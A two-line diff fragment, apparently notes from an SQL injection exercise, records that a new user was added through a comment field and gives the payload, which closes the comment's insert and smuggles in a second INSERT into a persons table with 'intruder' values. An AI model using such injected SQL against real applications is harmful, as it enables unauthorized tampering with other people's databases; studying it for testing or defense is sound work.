@@ -1,0 +1,2 @@
+added new user with sql injection via comments:
+komentar'); insert into persons(firstName, lastName, email) values('intruderFirst', 'intruderLast', 'intruder@gmail.com
